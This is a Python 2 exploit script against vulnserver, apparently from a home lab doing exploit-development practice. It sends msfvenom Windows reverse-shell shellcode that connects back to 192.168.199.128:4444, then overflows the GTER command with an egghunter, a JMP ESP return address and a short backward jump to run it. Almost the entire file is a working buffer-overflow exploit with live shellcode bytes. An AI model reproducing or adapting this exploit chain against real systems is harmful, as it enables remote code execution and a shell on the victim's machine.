import socket
import struct
import time

print "\nExploitation of GTER Command - Egghunter + Reverse Shell\n"

ip_addr = '192.168.199.130'
port = 9999
EGG = "T00W"

# send evil buffer to vulnserver
def send_evil_buffer(evil_buffer):

    did_send = False

    command = evil_buffer[:5]

    print "Sending buffer of length %s to command %s" % (len(evil_buffer), command)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.connect((ip_addr, int(port)))

    except Exception as e:
        print "[-] Failed to connect to service %s" % e

    else:
        print "[+] Connected to server"

        # Get banner response
        data = s.recv(1024)
        print(data)

        bytes_sent = s.send(evil_buffer)
        print "Sent %s bytes" % bytes_sent

        if bytes_sent > 0:
            did_send = True

    finally:
        s.close()
 
    return did_send

###############################################################################
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.199.128 LPORT=4444 -b "\x00" -f c
buf = (
"\xbd\x06\x48\x6e\xca\xd9\xee\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x4f\x31\x6a\x14\x03\x6a\x14\x83\xc2\x04\xe4\xbd\x92\x22\x61"
"\x3d\x6b\xb3\x11\xb7\x8e\x82\x03\xa3\xdb\xb7\x93\xa7\x8e\x3b"
"\x58\xe5\x3a\xcf\x2c\x22\x4c\x78\x9a\x14\x63\x79\x2b\x99\x2f"
"\xb9\x2a\x65\x32\xee\x8c\x54\xfd\xe3\xcd\x91\xe0\x0c\x9f\x4a"
"\x6e\xbe\x0f\xfe\x32\x03\x2e\xd0\x38\x3b\x48\x55\xfe\xc8\xe2"
"\x54\x2f\x60\x79\x1e\xd7\x0a\x25\xbf\xe6\xdf\x36\x83\xa1\x54"
"\x8c\x77\x30\xbd\xdd\x78\x02\x81\xb1\x46\xaa\x0c\xc8\x8f\x0d"
"\xef\xbf\xfb\x6d\x92\xc7\x3f\x0f\x48\x42\xa2\xb7\x1b\xf4\x06"
"\x49\xcf\x62\xcc\x45\xa4\xe1\x8a\x49\x3b\x26\xa1\x76\xb0\xc9"
"\x66\xff\x82\xed\xa2\x5b\x50\x8c\xf3\x01\x37\xb1\xe4\xee\xe8"
"\x17\x6e\x1c\xfc\x21\x2d\x49\x31\x1f\xce\x89\x5d\x28\xbd\xbb"
"\xc2\x82\x29\xf0\x8b\x0c\xad\xf7\xa1\xe8\x21\x06\x4a\x08\x6b"
"\xcd\x1e\x58\x03\xe4\x1e\x33\xd3\x09\xcb\x93\x83\xa5\xa4\x53"
"\x74\x06\x15\x3b\x9e\x89\x4a\x5b\xa1\x43\xfd\x5c\x36\xac\x56"
"\xa5\x47\x44\xa5\x29\x59\xc9\x20\xcf\x33\xe1\x64\x58\xac\x98"
"\x2c\x12\x4d\x64\xfb\xb2\xee\xf7\x60\x42\x78\xe4\x3e\x15\x2d"
"\xda\x36\xf3\xc3\x45\xe1\xe1\x19\x13\xca\xa1\xc5\xe0\xd5\x28"
"\x8b\x5d\xf2\x3a\x55\x5d\xbe\x6e\x09\x08\x68\xd8\xef\xe2\xda"
"\xb2\xb9\x59\xb5\x52\x3f\x92\x06\x24\x40\xff\xf0\xc8\xf1\x56"
"\x45\xf7\x3e\x3f\x41\x80\x22\xdf\xae\x5b\xe7\xef\xe4\xc1\x4e"
"\x78\xa1\x90\xd2\xe5\x52\x4f\x10\x10\xd1\x65\xe9\xe7\xc9\x0c"
"\xec\xac\x4d\xfd\x9c\xbd\x3b\x01\x32\xbd\x69"
)

shellcode_buffer = "STATS " +  EGG + EGG + buf
send_evil_buffer(shellcode_buffer)

time.sleep(1)

# Let's try an egghunter
# Egghunter Buffer
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
egghunter_buffer = "\x90" * (90 - len(egghunter)) + egghunter + '\x90'*10

# negative jump 60 bytes 
jmpshort = '\xeb\xc4\x90\x90'

jmp_esp = struct.pack("<I", 0x625011AF)
# Now we can try to send our egghunter shellcode to GTER   
evil_buffer = "GTER /.:/" + 'A'*(147 - len(egghunter_buffer)) + egghunter_buffer + jmp_esp + jmpshort + 'E'*(5000-147-4-4)
send_evil_buffer(evil_buffer)
